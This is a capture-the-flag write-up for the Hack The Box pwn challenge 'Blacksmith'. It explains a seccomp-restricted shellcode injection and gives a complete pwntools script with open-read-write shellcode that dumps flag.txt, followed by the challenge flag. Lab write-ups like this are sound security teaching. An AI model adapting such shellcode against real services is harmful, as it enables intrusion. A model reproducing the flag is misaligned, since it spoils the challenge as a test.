# Blacksmith

## Summary

Shellcode injection via `shield()` function. The binary has NX disabled and seccomp restricting to open/read/write/exit only. Send 57-byte ORW shellcode.

## Solution

### Step 1: Reconnaissance

The binary has NX disabled (executable stack), Full RELRO, Canary, and PIE. The `shield()` function calls `read(0, buf, 0x3f)` then `call *%rdx` on the buffer — direct shellcode execution. Seccomp blocks all syscalls except `open`, `read`, `write`, and `exit`.

### Step 2: Exploit

Menu flow: answer `1` (have materials), then `2` (craft shield). Send ORW shellcode that opens `./flag.txt`, reads it onto the stack, and writes it to stdout.

```python
#!/usr/bin/env python3
from pwn import *
import argparse

context.arch = 'amd64'
context.log_level = 'info'

def exploit(r):
    r.recvuntil(b'1. Yes, everything is here!')
    r.sendline(b'1')
    r.recvuntil(b'What do you want me to craft?')
    r.sendline(b'2')

    orw_shellcode = asm("""
        jmp get_str
    str_data:
        .ascii "./flag.txt"
        .byte 0
    get_str:
        lea rdi, [rip + str_data]
        xor esi, esi
        xor edx, edx
        push 2
        pop rax
        syscall

        mov edi, eax
        mov rsi, rsp
        push 0x100
        pop rdx
        xor eax, eax
        syscall

        mov edx, eax
        push 1
        pop rdi
        mov rsi, rsp
        push 1
        pop rax
        syscall
    """)

    r.send(orw_shellcode)
    resp = r.recvall(timeout=5)
    log.success(f"Output:\n{resp}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--remote', '-r', help='Remote target (host:port)')
    args = parser.parse_args()
    if args.remote:
        host, port = args.remote.split(':')
        r = remote(host, int(port))
    else:
        basedir = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Easy/Blacksmith/challenge'
        r = process([f'{basedir}/blacksmith'], cwd=basedir)
    exploit(r)
```

## Flag

```
HTB{s3cc0mp_1s_t00_s3cur3}
```
